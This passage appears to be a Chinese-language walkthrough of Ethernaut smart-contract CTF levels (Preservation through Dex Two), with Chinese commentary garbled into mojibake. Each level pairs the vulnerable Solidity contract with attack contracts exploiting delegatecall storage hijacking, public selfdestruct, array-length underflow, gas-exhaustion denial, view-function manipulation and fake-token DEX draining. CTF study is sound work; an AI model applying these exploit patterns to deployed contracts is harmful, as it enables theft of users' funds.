amount);\n            &#125;\n        &#125;\n        _transfer(sender, recipient, amount);\n        return true;\n    &#125;\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) &#123;\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    &#125;\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) &#123;\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked &#123;\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        &#125;\n\n        return true;\n    &#125;\n    function _transfer(address sender,address recipient,uint256 amount) internal virtual &#123;\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked &#123;\n            _balances[sender] = senderBalance - amount;\n        &#125;\n        _balances[recipient] += amount;\n\n        emit Transfer(sender, recipient, amount);\n\n        _afterTokenTransfer(sender, recipient, amount);\n    &#125;\n    function _mint(address account, uint256 amount) internal virtual &#123;\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    &#125;\n    function _burn(address account, uint256 amount) internal virtual &#123;\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked &#123;\n            _balances[account] = accountBalance - amount;\n        &#125;\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    &#125;\n    function _approve(address owner,address spender,uint256 amount) internal virtual &#123;\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    &#125;\n    function _beforeTokenTransfer(address from,address to,uint256 amount) internal virtual &#123;&#125;\n    function _afterTokenTransfer(address from,address to,uint256 amount) internal virtual &#123;&#125;\n&#125;\n\nAnalyzeä¸»è¦æ˜¯è€ƒå¯Ÿäº†erc20ï¼Œä¹‹å‰æœ‰è¿‡ä¸€äº›äº†è§£\nå­¦ä¹ åˆ°äº†solidityä¸­superçš„å«ä¹‰ï¼ŒæŒ‡çš„æ˜¯è°ƒç”¨ç»§æ‰¿åˆçº¦ä¸­çš„å‡½æ•°ï¼Œå¦‚ä¸‹ä¸ºæµ‹è¯•åˆçº¦ï¼ˆå¯ä¾›æ›´å¥½çš„ç†è§£superï¼‰&#x3D;&#x3D;å­¦ä¹ é“¾æŽ¥&#x3D;&#x3D;\npragma solidity ^0.4.5;\ncontract C &#123;\n     uint u;\n     function f() &#123;\n       u = 1;\n     &#125;\n&#125;\ncontract B is C &#123;\n     function f() &#123;\n       u = 2;\n     &#125;\n&#125;\ncontract A is B &#123;\n     function f() &#123;  // will set u to 3\n       u = 3;\n     &#125;\n     function f1() &#123; // will set u to 2\n       //å½“ä½¿ç”¨superæ—¶ï¼Œè°ƒç”¨çš„æ˜¯ç»§æ‰¿çš„è¯¥å‡½æ•°ï¼Œä¸æ˜¯å®ƒè‡ªå·±ï¼Œæ¯”å¦‚ä¸‹è¾¹ç»™å‡ºçš„ä¾‹å­ä¸­ï¼Œå‡½æ•°åå­—æ˜¯ç›¸åŒçš„ï¼Œè¦çŸ¥é“è°ƒç”¨çš„ä¸æ˜¯å®ƒè‡ªå·±ï¼Œæ˜¯ç»§æ‰¿çˆ¶åˆçº¦ä¸­çš„åŒåå‡½æ•°ã€‚\n       super.f();\n     &#125;\n     function f2() &#123; // will set u to 2\n       B.f();\n     &#125;\n     function f3() &#123; // will set u to 1\n       C.f();\n     &#125;\n&#125;\n\nAttackçœ‹äº†å¥½ä¹…å‘çŽ°è¿™é“é¢˜å¥½åƒä¸èƒ½ä½¿ç”¨åˆçº¦è¿›è¡Œæ”»å‡»ï¼Œå› ä¸ºæŽˆæƒæ“ä½œéƒ½æ˜¯ä»¥msg.senderä½œä¸ºownerï¼Œmsg.senderåªèƒ½æ˜¯åˆçº¦ï¼ˆä½¿ç”¨åˆçº¦æ”»å‡»çš„æƒ…å†µä¸‹ï¼‰ã€‚è€Œè¦ä½¿balanceOf[tx.origin]ä¸º0å°±åªèƒ½åœ¨é¢˜ç›®çŽ¯å¢ƒä¸‹è§£é¢˜\nawait contract.approve(player,toWei('1000000'))//ç»™è‡ªå·±æŽˆæƒ\nawait contract.transferFrom(player,'0x24fBFF0FbF51c62a64b4ED381C4E039E03dD2d6a',toWei('1000000')//å°†æŽˆæƒçš„æ•°é‡è½¬èµ°\n\n16.Preservation\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šThis contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.The goal of this level is for you to claim ownership of the instance you are given.\n Things that might help\n\nLook into Solidityâ€™s documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.\nUnderstanding what it means for delegatecall to be context-preserving.\nUnderstanding how storage variables are stored and accessed.\nUnderstanding how casting works between different data types.\n\nCodepragma solidity ^0.6.0;\n\ncontract Preservation &#123;\n\n  // public library contracts \n  address public timeZone1Library;\n  address public timeZone2Library;\n  address public owner; \n  uint storedTime;\n  // Sets the function signature for delegatecall\n  bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;\n    timeZone1Library = _timeZone1LibraryAddress; \n    timeZone2Library = _timeZone2LibraryAddress; \n    owner = msg.sender;\n  &#125;\n \n  // set the time for timezone 1\n  function setFirstTime(uint _timeStamp) public &#123;\n    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n  &#125;//ä½¿ç”¨delegatecallè°ƒç”¨setTimeå‚¨å­˜ä¸ºstoredTimeï¼ŒstoredTimeå ç”¨slot0ï¼Œdelegatecallè¿›è¡Œå¸¦å“¦ç”¨ä¹‹åŽæ‰§è¡ŒçŽ¯å¢ƒä¸ºæ”»å‡»åˆçº¦ï¼Œæ‰€ä»¥è¯¥åˆçº¦ä¹‹ä¸‹çš„slot0ä¼šè¢«ä¿®æ”¹ä¸ºä¼ å…¥çš„uintæ•°æ®ï¼Œå³timeZone1Libraryå¯æŽ§\n\n  // set the time for timezone 2\n  function setSecondTime(uint _timeStamp) public &#123;\n    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n  &#125;\n&#125;\n\n// Simple library contract to set the time\ncontract LibraryContract &#123;\n\n  // stores a timestamp \n  uint storedTime;  \n\n  function setTime(uint _time) public &#123;\n    storedTime = _time;\n  &#125;\n&#125;\n\nAnalyzeå­¦ä¹ è¿‡ç¨‹å‚è€ƒ13.Delegatecall\nAttzckcontract attack&#123;\naddress a;\naddress b;\naddress owner;//å°†owneråˆå§‹åŒ–åœ¨slot2ï¼Œå³å¯ä½¿ä¿®æ”¹çš„æ•°æ®ä¸ºè¢«æ”»å‡»åˆçº¦çš„slot2\nPreservation target=Preservation(0x7ad5909C5ACde5A2a5B548280F980844e2564102);\nfunction changetimeZone1Library(uint a)public &#123;\n    target.setFirstTime(a);\n&#125;//ç¬¬ä¸€æ¬¡è°ƒç”¨å°†timeZone1Libraryæ”¹å˜ä¸ºæ”»å‡»åˆçº¦åœ°å€\n//å†æ¬¡è°ƒç”¨åˆ™æ˜¯è°ƒç”¨æ”»å‡»åˆçº¦åœ°å€ä¸‹çš„setTime(uint256)ï¼Œæ­¤æ—¶å³å¯æ‰§è¡Œæ”»å‡»ä»£ç \nfunction setTime(uint256 a) public&#123;\n     owner=tx.origin;\n&#125;//æŠ˜ç£¨äº†å¥½ä¹…åˆæ˜¯oogï¼Œæžœç„¶å­˜åœ¨callå°±è¦æ³¨æ„gasé™åˆ¶çš„é—®é¢˜\n&#125;\n\n17.Recovery\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šA contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address.This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address.\nCodepragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Recovery &#123;\n\n  //generate tokens\n  function generateToken(string memory _name, uint256 _initialSupply) public &#123;\n    new SimpleToken(_name, msg.sender, _initialSupply);\n  \n  &#125;\n&#125;\n\ncontract SimpleToken &#123;\n\n  using SafeMath for uint256;\n  // public variables\n  string public name;\n  mapping (address => uint) public balances;\n\n  // constructor\n  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;\n    name = _name;\n    balances[_creator] = _initialSupply;\n  &#125;\n\n  // collect ether in return for tokens\n  receive() external payable &#123;\n    balances[msg.sender] = msg.value.mul(10);\n  &#125;\n\n  // allow transfers of tokens\n  function transfer(address _to, uint _amount) public &#123; \n    require(balances[msg.sender] >= _amount);\n    balances[msg.sender] = balances[msg.sender].sub(_amount);\n    balances[_to] = _amount;\n  &#125;\n\n  // clean up after ourselves\n  function destroy(address payable _to) public &#123;\n    selfdestruct(_to);\n  &#125;\n&#125;\n\nAnalyzeé¢˜ç›®è¯´creatoråœ¨è¿›è¡Œéƒ¨ç½²åˆçº¦åŽè¿›è¡Œäº†åˆçº¦äº¤äº’åˆ›å»ºäº†SimpleTokenåˆçº¦å¹¶è½¬å…¥äº†0.5ethï¼Œä½†SimpleTokenåˆçº¦åœ°å€ä¸¢å¤±,ä½†æ˜¯è¿™äº›æ“ä½œæ˜¯åœ¨å®žä¾‹åœ°å€ä¸‹è¿›è¡Œçš„ï¼Œæ‰“å¼€åŒºå—é“¾æµè§ˆå™¨åŽæŸ¥è¯¢å®žä¾‹åœ°å€å¹¶ç»“åˆé¢˜ç›®è¦æ±‚åˆ†æžå®žä¾‹ä¸‹çš„äº¤æ˜“\nâ‘ èŽ·å¾—å®žä¾‹åœ°å€\n\nâ‘¡æŸ¥çœ‹è¿›è¡Œè¿‡çš„äº¤æ˜“å¹¶è¿›è¡Œåˆ†æž\n\n\nç»“åˆé¢˜ç›®å¯çŸ¥å…³å¡åœ°å€ä¸º0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2ï¼Œæ‰€ä»¥æ“ä½œä¸€æ˜¯æˆ‘ä»¬å•æœºåˆ›å»ºæ–°å®žä¾‹äº§ç”Ÿçš„äº¤æ˜“\né¢˜ç›®è¯´creatorè¿›è¡Œäº†å¯¹generateTokençš„è°ƒç”¨åˆ›å»ºäº†ä¸€ä¸ªSimpleTokenåˆçº¦ï¼Œæ‰€ä»¥æ“ä½œäºŒæ˜¯creatorè°ƒç”¨å‡½æ•°è¿›è¡Œåˆçº¦äº¤äº’\né¢˜ç›®è¯´creatorè¿›è¡Œäº†å¯¹generateTokençš„è°ƒç”¨åˆ›å»ºäº†ä¸€ä¸ªSimpleTokenåˆçº¦ï¼Œæ‰€ä»¥æ“ä½œä¸‰æ˜¯åˆ›å»ºäº†SimpleTokenåˆçº¦(0xFc777940566cE74f839101ba1842be4B6f69EDC2)\næ‰€ä»¥creatoræ˜¯æƒ³è¿™ä¸ªåˆçº¦è½¬è´¦äº†0.5ethï¼Œè¯¥åˆçº¦ä¸‹åˆæœ‰publicçš„selfdestructå‡½æ•°destroyï¼Œæ‰€ä»¥ç›´æŽ¥æž„å»ºæ”»å‡»åˆçº¦è°ƒç”¨destroyå‡½æ•°å³å¯\n\n\nAttackpragma solidity ^0.6.0;\ncontract SimpleToken &#123;\n function destroy(address payable _to) public &#123;\n    selfdestruct(_to);\n  &#125;\n&#125;\ncontract attack&#123;\n    SimpleToken target = SimpleToken(0xFc777940566cE74f839101ba1842be4B6f69EDC2);\n    function pwn(address payable to)public &#123;\n        target.destroy(to);\n    &#125;\n&#125;\n\n18.MagicNumber\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šTo solve this level, you only need to provide the Ethernaut with a Solver, a contract that responds to whatIsTheMeaningOfLife() with the right number.Easy right? Wellâ€¦ thereâ€™s a catch.The solverâ€™s code needs to be really tiny. Really reaaaaaallly tiny. Like freakinâ€™ really really itty-bitty tiny: 10 opcodes at most.Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. Thatâ€™s right: Raw EVM bytecode.Good luck!\nCodepragma solidity ^0.6.0;\n\ncontract MagicNum &#123;\n\n  address public solver;\n\n  constructor() public &#123;&#125;\n\n  function setSolver(address _solver) public &#123;\n    solver = _solver;\n  &#125;\n\nAnalyzeå­¦ä¹ é“¾æŽ¥â‘ \nå­¦ä¹ é“¾æŽ¥â‘¡\nå­¦ä¹ é“¾æŽ¥â‘¢\næž„å»ºdataï¼š\né¦–å…ˆï¼Œ42è¿™ä¸ªæ•°å­—æ¥çš„å¤ªä¸è½»æ¾äº†ï¼ï¼ï¼\n\nâ‘ å…ˆæž„å»ºruntime codesï¼š0x60 0x2a 0x60 0x80 0x52 0x60 0x20 0x60 0x80 0xf3\n&#123;\n0x602a     ;PUSH1 0x2a                  v\n0x6080     ;PUSH1 0x80                  p\n0x52       ;MSTORE\n&#125;&#x2F;&#x2F;mstore(p, v) pä»£è¡¨positionä½ç½®ï¼Œvä»£è¡¨valueå€¼\n&#123;\n0x6020     ;PUSH1 0x20                  s\n0x6080     ;PUSH1 0x80                  p\n0xf3       ;RETURN\n&#125;&#x2F;&#x2F;return(p,s)pä»£è¡¨positionä½ç½®ï¼Œsä»£è¡¨sizeå­˜å‚¨æ‰€å å¤§å°\næ‰€ä»¥runtime codesï¼š602a60805260206080f3\n\nâ‘¡æž„å»ºinitialization codesï¼š0x60 0x0a 0x60 0x?? 0x60 0x00 0x39 0x60 0x0a 0x60 0x00 0xf3\ncopy code&#123;\n0x600a     ;PUSH1 0x0a                     S(runtime code size)\n0x60??     ;PUSH1 0x??                     F(current position of runtime opcodes)\n0x6000     ;PUSH1 0x00                     T(destination memory index 0)\n0x39       ;CODECOPY\n&#125;&#x2F;&#x2F;codecopy(t, f, s)tä»£è¡¨targetç›®æ ‡ä½ç½®ï¼Œfä»£è¡¨runtime codesä½ç½®ï¼Œsä»£è¡¨sizeä»£ç å¤§å°\nreturn code&#123;\n0x600a     ;PUSH1 0x0a                     S\n0x6000     ;PUSH1 0x00                     P\n0xf3       ;RETURN\n&#125;&#x2F;&#x2F;return(p,s)pä»£è¡¨positionä½ç½®ï¼Œsä»£è¡¨sizeå­˜å‚¨æ‰€å å¤§å°\ninitialization codeså ç”¨äº†12ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥??åº”è¯¥æ˜¯0c\næ‰€ä»¥initialization codesï¼š600a600c600039600a6000f3\n\nâ‘¢å¾—åˆ°dataï¼š600a600c60&#x3D;&#x3D;00&#x3D;&#x3D;39600a60&#x3D;&#x3D;00&#x3D;&#x3D;f3602a60&#x3D;&#x3D;80&#x3D;&#x3D;52602060&#x3D;&#x3D;80&#x3D;&#x3D;f3(é«˜äº®éƒ¨åˆ†éžå”¯ä¸€ç­”æ¡ˆï¼Œæ¯”å¦‚600a600c60&#x3D;&#x3D;10&#x3D;&#x3D;39600a60&#x3D;&#x3D;10&#x3D;&#x3D;f3602a60&#x3D;&#x3D;70&#x3D;&#x3D;52602060&#x3D;&#x3D;70&#x3D;&#x3D;f3)\nAttackawait sendTransaction(&#123;from:player,data:600a600c601039600a6010f3602a60705260206070f3&#125;)\n //åˆ›å»ºåˆçº¦æ ¹æ®äº¤æ˜“å“ˆå¸ŒèŽ·å¾—åˆçº¦åœ°å€\n contract attack&#123;\n      MagicNum target=MagicNum(0x397175529CC088e12C7bb281403F2a15aDD6c9a5);\n      function pwn(address a)public&#123;\n          target.setSolver(a);\n      &#125;//ä¼ å…¥åˆšåˆšåˆ›å»ºçš„åœ°å€ï¼Œè¿›è¡Œè°ƒç”¨\n  &#125;\n\n19.Alien CodexCodepragma solidity ^0.5.0;\n\nimport '../helpers/Ownable-05.sol';\n\ncontract AlienCodex is Ownable &#123;\n\n  bool public contact;\n  bytes32[] public codex;\n\n  modifier contacted() &#123;\n    assert(contact);\n    _;\n  &#125;\n  \n  function make_contact() public &#123;\n    contact = true;\n  &#125;\n\n  function record(bytes32 _content) contacted public &#123;\n  \tcodex.push(_content);\n  &#125;\n\n  function retract() contacted public &#123;\n    codex.length--;\n  &#125;\n\n  function revise(uint i, bytes32 _content) contacted public &#123;\n    codex[i] = _content;\n  &#125;\n&#125;\n\nAnalyzeè¿™ä¸€å…³åˆ©ç”¨äº† EVM ä¸ä¼šéªŒè¯ä¸€ä¸ªæ•°ç»„çš„ ABI-encoded é•¿åº¦å’Œä»–çœŸå®žçš„payloadçš„é—®é¢˜.\nå¹¶ä¸”ä»–åˆ©ç”¨äº†æ•°ç»„é•¿åº¦çš„ç®—æ•°ä¸‹æº¢, é€šè¿‡æ‰©å¤§æ•°ç»„åˆ°æ•´ä¸ª 2^256 çš„å­˜å‚¨åŒºåŸŸ. ç„¶åŽç”¨æˆ·å°±å¯ä»¥æ›´æ”¹æ‰€æœ‰åˆçº¦çš„storageäº†.\nè¿™ä¸¤ä¸ªæ¼æ´žéƒ½æ˜¯å—è¿™ä¸ªå¯å‘ Underhanded coding contest\nAttackpragma solidity ^0.6.0;\n\ninterface AlienCodex &#123;\n\n  function make_contact() external ;\n\n  function record(bytes32 _content) external ;\n\n  function retract()  external ;\n\n  function revise(uint i, bytes32 _content) external ;\n&#125;\n\ncontract Attack &#123;\n    AlienCodex target = AlienCodex(0x53c5A404b93e96DA6b913c222b728E8825f987E5);\n    bytes32 public payload = 0x000000000000000000000002b2E23ceC9921288f63F60A839E2B28235bc22ad;\n    function attack() public &#123;\n        target.make_contact();\n        target.retract();\n        uint i = 2**256 - 1 - uint(keccak256(abi.encodePacked(uint(1)))) +1;\n        target.revise(i, payload);\n    &#125;\n&#125;\n\n\næ­¤æ—¶codex.lengthä¸º2**256-1ï¼Œmap[x]çš„å­˜å‚¨åœ°å€ä¸ºkeccak256(slot(codex)),æ­¤å¤„slot(map)ä¸º1ï¼Œmap[x]å­˜å‚¨åœ°å€ä¸ºkeccak256(slot(codex))+x,æ‰€ä»¥æž„é€ xä¸º 2^256-keccak256(1)ï¼Œpayloadä¸ºä»»æ„åœ°å€å³å¯è¦†ç›–Ownable-05.solä¸­çš„ownerå˜é‡ï¼ˆownerå’Œcontactéƒ½å­˜å‚¨åœ¨slot0ï¼‰\n20.Denial\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šThis is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.\nIf you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.\nCodepragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Denial &#123;\n\n    using SafeMath for uint256;\n    address public partner; // withdrawal partner - pay the gas, split the withdraw\n    address payable public constant owner = address(0xA9E);\n    uint timeLastWithdrawn;\n    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances\n\n    function setWithdrawPartner(address _partner) public &#123;\n        partner = _partner;\n    &#125;\n\n    // withdraw 1% to recipient and 1% to owner\n    function withdraw() public &#123;\n        uint amountToSend = address(this).balance.div(100);\n        // perform a call without checking return\n        // The recipient can revert, the owner will still get their share\n        partner.call&#123;value:amountToSend&#125;(\"\");\n        owner.transfer(amountToSend);\n        // keep track of last withdrawal time\n        timeLastWithdrawn = now;\n        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);\n    &#125;\n\n    // allow deposit of funds\n    receive() external payable &#123;&#125;\n\n    // convenience function\n    function contractBalance() public view returns (uint) &#123;\n        return address(this).balance;\n    &#125;\n&#125;\n\nAnalyzeé¢˜ç›®åœ¨withdrawå‡½æ•°ä¸­ä½¿ç”¨äº†callè½¬è´¦çš„æ–¹å¼ï¼Œå‘partnerè¿›è¡Œè½¬è´¦ï¼Œå¹¶ä¸”partneråœ°å€å¯æŽ§ï¼Œæ‰€ä»¥å¾ˆæ˜¾ç„¶è¿™é“é¢˜çš„é‡ç‚¹åœ¨äºŽæ”»å‡»åˆçº¦çš„fallback()å‡½æ•°æž„é€ ã€‚\nè€Œé¢˜ç›®è¦æ±‚æŽ¨è¿Ÿå¯¹ownerçš„transferï¼Œåªéœ€è¦è®©äº¤æ˜“åœ¨callå¤„è€—å°½gaså³å¯\nä»Žgithubçš„wpä¸Šæ‘˜å½•ä¸‹æ¥çš„ã€‚\n\n\n\n\n\n\n\n\n\n\n\nexpression\nsyntax\neffect\nOPCODE\n\n\n\nthrow\nif (condition) &#123; throw; &#125;\nreverts all state changes and deplete gas\nversion&lt;0.4.1: INVALID OPCODE - 0xfe, after: REVERT- 0xfd\ndeprecated in version 0.4.13 and removed in version 0.5.0\n\n\nassert\nassert(condition);\nreverts all state changes and depletes all gas\nINVALID OPCODE - 0xfe\n\n\n\nrevert\nif (condition) &#123; revert(value) &#125;\nreverts all state changes, allows returning a value, refunds remaining gas to caller\nREVERT - 0xfd\n\n\n\nrequire\nrequire(condition, &quot;comment&quot;)\nreverts all state changes, allows returning a value, refunds remaining gas to calle\nREVERT - 0xfd\n\n\n\nAttackpoc1ï¼š\npragma solidity ^0.6.0;\ncontract Denial&#123;\n     function setWithdrawPartner(address _partner) public&#123;&#125;\n     function withdraw() public&#123;&#125;\n&#125;\ncontract attack&#123;\n    Denial target=Denial(0x6Ae82f201182a50F89bed000Cf30CA72E2080c34);\n    function set() public &#123;\n        target.setWithdrawPartner(address(this));\n    &#125;\n    fallback() external payable&#123;\n      assert(false);\n    &#125;\n&#125;\n\n\n\npoc2ï¼š\ncontract Denial&#123;\n     function setWithdrawPartner(address _partner) public&#123;&#125;\n     function withdraw() public&#123;&#125;\n&#125;\ncontract attack2&#123;\n     Denial target=Denial(0x782682cf3433fF0F5223163A0120da1548f9Efe8);\n    function set() public &#123;\n        target.setWithdrawPartner(address(this));\n    &#125;\n    fallback() external payable&#123;\n        if(address(target).balance>0)\n        target.withdraw();\n    &#125;\n    function kill(address payable addr) public payable&#123;\n        selfdestruct(addr);\n    &#125;\n&#125;\n\n21.Shop\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šÐ¡an you get the item from the shop for less than the price asked?\nThings that might help:\n\nShop expects to be used from a Buyer\nUnderstanding restrictions of view functions\n\nCodepragma solidity ^0.6.0;\n\ninterface Buyer &#123;\n  function price() external view returns (uint);\n&#125;\n\ncontract Shop &#123;\n  uint public price = 100;\n  bool public isSold;\n\n  function buy() public &#123;\n    Buyer _buyer = Buyer(msg.sender);\n\n    if (_buyer.price() >= price &amp;&amp; !isSold) &#123;\n      isSold = true;\n      price = _buyer.price();\n    &#125;\n  &#125;\n&#125;\n\nAnalyzeä¸¤æ¬¡è°ƒç”¨äº†_buyer.price()ï¼Œç¬¬ä¸€æ¬¡å¤§äºŽ100ï¼Œç¬¬äºŒæ¬¡å°äºŽ100å³å¯\nAttackcontract Buyer&#123;\n     Shop target=Shop(0xB77306dcaD300299355F96a9c499082176523312);\nfunction price() public view  returns (uint)&#123;\n      if(target.isSold() == true)&#123;\n          return 1;\n      &#125;else&#123;\n          return 110;\n      &#125;\n  &#125;\n    function set() public&#123;\n        target.buy();\n    &#125;\n&#125;\n\n22.Dex\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šå–å…‰ä»»ä¸€token\nCodepragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Dex  &#123;\n  using SafeMath for uint;\n  address public token1;\n  address public token2;\n  constructor(address _token1, address _token2) public &#123;\n    token1 = _token1;\n    token2 = _token2;\n  &#125;\n\n  function swap(address from, address to, uint amount) public &#123;\n    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), \"Invalid tokens\");\n    require(IERC20(from).balanceOf(msg.sender) >= amount, \"Not enough to swap\");\n    uint swap_amount = get_swap_price(from, to, amount);\n    IERC20(from).transferFrom(msg.sender, address(this), amount);\n    IERC20(to).approve(address(this), swap_amount);\n    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);\n  &#125;\n\n  function add_liquidity(address token_address, uint amount) public&#123;\n    IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n  &#125;\n\n  function get_swap_price(address from, address to, uint amount) public view returns(uint)&#123;\n    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));\n  &#125;\n\n  function approve(address spender, uint amount) public &#123;\n    SwappableToken(token1).approve(spender, amount);\n    SwappableToken(token2).approve(spender, amount);\n  &#125;\n\n  function balanceOf(address token, address account) public view returns (uint)&#123;\n    return IERC20(token).balanceOf(account);\n  &#125;\n&#125;\n\ncontract SwappableToken is ERC20 &#123;\n  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;\n        _mint(msg.sender, initialSupply);\n  &#125;\n&#125;\n\nAnalyzeè¿™å…³æ²¡ä»€ä¹ˆéš¾åº¦ï¼Œåªæ˜¯æ¯”è¾ƒç¹çï¼Œéƒ¨ç½²åˆçº¦æ—¶å€™ç»™äº†ä¸€å®šæ•°é‡çš„tokenï¼Œæ¢æ¥æ¢åŽ»çŸ¥é“å–èµ°æ‰€æœ‰å³å¯\n23.Dex Two\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šAs weâ€™ve repeatedly seen, interaction between contracts can be a source of unexpected behavior.\nJust because a contract claims to implement the ERC20 spec does not mean itâ€™s trust worthy.\nSome tokens deviate from the ERC20 spec by not returning a boolean value from their transfer methods. See Missing return value bug - At least 130 tokens affected.\nOther ERC20 tokens, especially those designed by adversaries could behave more maliciously.\nIf you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.\nCodepragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract DexTwo  &#123;\n  using SafeMath for uint;\n  address public token1;\n  address public token2;\n  constructor(address _token1, address _token2) public &#123;\n    token1 = _token1;\n    token2 = _token2;\n  &#125;\n\n  function swap(address from, address to, uint amount) public &#123;\n    require(IERC20(from).balanceOf(msg.sender) >= amount, \"Not enough to swap\");\n    uint swap_amount = get_swap_amount(from, to, amount);\n    IERC20(from).transferFrom(msg.sender, address(this), amount);\n    IERC20(to).approve(address(this), swap_amount);\n    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);\n  &#125;\n\n  function add_liquidity(address token_address, uint amount) public&#123;\n    IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n  &#125;\n\n  function get_swap_amount(address from, address to, uint amount) public view returns(uint)&#123;\n    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));\n  &#125;\n\n  function approve(address spender, uint amount) public &#123;\n    SwappableTokenTwo(token1).approve(spender, amount);\n    SwappableTokenTwo(token2).approve(spender, amount);\n  &#125;\n\n  function balanceOf(address token, address account) public view returns (uint)&#123;\n    return IERC20(token).balanceOf(account);\n  &#125;\n&#125;\n\ncontract SwappableTokenTwo is ERC20 &#123;\n  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;\n        _mint(msg.sender, initialSupply);\n  &#125;\n&#125;\n\nAnalyzeä¸åŒäºŽDexé‚£é“é¢˜ï¼Œè¿™é“é¢˜å¯ä»¥è‡ªå·±é€‰æ‹©tokenè¿›è¡Œäº¤æ¢ï¼Œæ‰€ä»¥ä¼´éšäº†ä¸€ä¸ªæ¼æ´žï¼Œtoken_addresså¯æŽ§ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªä»£å¸è‡ªè¡Œæž„é€ IERC20(from).balanceOf(address(this)çš„æ•°å€¼ï¼Œå¯ä»¥ç›´æŽ¥å–èµ°å¦ä¸€tokenã€‚\nAttackpragma solidity ^0.6.0;\ncontract DexTwo&#123;\n    function swap(address from, address to, uint amount)public&#123;&#125;\n     function add_liquidity(address token_address, uint amount)public&#123;\n          IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n     &#125;\n&#125;\ncontract attack&#123;\n    mapping (address => uint) public _balanceOf;\n    mapping(address => mapping(address => uint256)) public _allowances;\n    address private owner;\n    DexTwo target=DexTwo(0xa651bC1624316539cE6142f0355021f44c64D7b6);\n    constructor() public&#123;\n        owner = msg.sender;\n        _balanceOf[address(this)]=1*10**18;\n        _balanceOf[owner]=1*10**18;\n    &#125;\n    function transferFrom(address sender,address receipent,uint amount) public returns (bool)&#123;\n        _balanceOf[sender]-=amount;\n        _balanceOf[receipent]+=amount;\n        return true;\n    &#125;\n    function balanceOf(address haver) public returns(uint)&#123;\n        return _balanceOf[haver];\n    &#125;\n    function add(address ed,uint amount) public&#123;\n        target.add_liquidity(ed,amount);\n    &#125;\n    function pwn(address from, address to, uint amount)public&#123;\n        target.swap(from,to,amount);\n    &#125;\n&#125;\ncontract IERC20 is 